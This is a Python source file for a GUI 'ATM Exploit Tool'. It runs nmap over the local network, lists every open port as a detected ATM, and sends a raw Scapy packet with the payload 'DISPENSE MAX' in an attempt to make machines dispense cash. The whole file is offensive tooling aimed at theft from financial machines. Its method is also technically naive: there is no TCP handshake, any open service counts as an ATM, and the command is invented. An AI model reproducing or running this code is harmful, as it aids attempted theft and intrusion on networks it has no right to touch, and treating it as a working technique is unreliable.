import os
import re
import logging
import time
from scapy.all import *
from tkinter import Tk, Button, Listbox, Label, messagebox, ttk
import netifaces
from threading import Thread

# Setting up logging
logging.basicConfig(filename="atm_exploit.log", level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")


class ATMExploitTool:
    def __init__(self):
        self.atms = []  # List of detected ATMs
        self.selected_atm = None

    def get_local_network_range(self):
        """Automatically detect the local network range."""
        try:
            iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
            local_ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
            network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
            return network
        except KeyError:
            logging.error("Failed to detect default gateway or network interface.")
            messagebox.showerror("Error", "No valid network interface found.")
            return None

    def scan_for_atms(self, network):
        """Scan for ATMs on the network using Nmap."""
        if not network:
            logging.error("No valid network range provided for scanning.")
            return []

        print(f"Scanning network {network} for ATMs...")
        nmap_output_file = "nmap_results.txt"

        try:
            # Run Nmap and save results to a file
            os.system(f"nmap -p- -sV --open -oN {nmap_output_file} {network}")
            print("Scan complete. Parsing results...")

            # Parse the Nmap output to extract IPs and ports of potential ATMs
            self.atms = self.parse_nmap_results(nmap_output_file)
            if self.atms:
                print(f"Found ATMs: {self.atms}")
            else:
                print("No ATMs found.")
            return self.atms
        except Exception as e:
            logging.error(f"Error during Nmap scan: {e}")
            messagebox.showerror("Error", "Failed to complete network scan.")
            return []

    def parse_nmap_results(self, filename):
        """Extract IPs and open ports from Nmap results."""
        atms = []
        try:
            with open(filename, "r") as file:
                lines = file.readlines()
        except FileNotFoundError:
            logging.error(f"Nmap results file '{filename}' not found.")
            return atms

        current_ip = None
        for line in lines:
            try:
                ip_match = re.match(r"Nmap scan report for (.+)", line)
                if ip_match:
                    current_ip = ip_match.group(1)
                elif current_ip and re.search(r"open", line):
                    port_match = re.match(r"(\d+)/tcp\s+open\s+(.+)", line)
                    if port_match:
                        port = int(port_match.group(1))
                        service = port_match.group(2)
                        atms.append({"ip": current_ip, "port": port, "service": service})
            except Exception as e:
                logging.error(f"Error parsing line: {line.strip()} - {e}")
        return atms

    def exploit_atm(self, atm):
        """Exploit a detected ATM using Scapy."""
        try:
            print(f"Exploiting ATM at {atm['ip']} on port {atm['port']}...")
            payload = f"DISPENSE MAX\n".encode()
            packet = IP(dst=atm["ip"]) / TCP(dport=atm["port"], flags="PA") / payload
            send(packet, verbose=False, timeout=2)
            print("Payload sent successfully. ATM should dispense cash if vulnerable.")
            return True
        except Exception as e:
            logging.error(f"Failed to exploit ATM at {atm['ip']}:{atm['port']}: {e}")
            return False


class ATMExploitGUI:
    def __init__(self, controller):
        self.controller = controller
        self.root = Tk()
        self.root.title("ATM Exploit Tool")

        # UI Elements
        Label(self.root, text="Detected ATMs:").pack()
        self.atm_list = Listbox(self.root)
        self.atm_list.pack()

        Button(self.root, text="Scan for ATMs", command=self.scan_atms).pack()
        Button(self.root, text="Exploit Selected ATM", command=self.exploit_selected_atm).pack()

        self.progress_label = Label(self.root, text="Status: Waiting for action...")
        self.progress_label.pack()

        self.progress_bar = ttk.Progressbar(self.root, orient="horizontal", length=200, mode="indeterminate")
        self.progress_bar.pack()

    def scan_atms(self):
        """Scan the network for ATMs and populate the list."""
        def task():
            try:
                self.atm_list.delete(0, "end")
                network = self.controller.get_local_network_range()
                if not network:
                    return
                
                self.progress_label.config(text="Scanning for ATMs...")
                self.progress_bar.start()

                atms = self.controller.scan_for_atms(network)

                self.progress_bar.stop()
                self.progress_label.config(text="Scan complete.")
                for atm in atms:
                    self.atm_list.insert("end", f"{atm['ip']}:{atm['port']} ({atm['service']})")
            except Exception as e:
                self.progress_bar.stop()
                logging.error(f"Error during ATM scan: {e}")
                messagebox.showerror("Error", "An error occurred while scanning for ATMs.")

        Thread(target=task).start()

    def exploit_selected_atm(self):
        """Exploit the selected ATM."""
        selection = self.atm_list.curselection()
        if not selection:
            messagebox.showwarning("Warning", "No ATM selected.")
            return

        atm_index = selection[0]
        atm = self.controller.atms[atm_index]

        def task():
            self.progress_label.config(text=f"Exploiting ATM at {atm['ip']}...")
            if self.controller.exploit_atm(atm):
                messagebox.showinfo("Success", "ATM exploited successfully! Cash should dispense.")
            else:
                messagebox.showerror("Error", "Failed to exploit ATM.")
            self.progress_label.config(text="Status: Waiting for action...")

        Thread(target=task).start()

    def run(self):
        self.root.mainloop()


# Main Function
if __name__ == "__main__":
    controller = ATMExploitTool()
    gui = ATMExploitGUI(controller)
    gui.run()
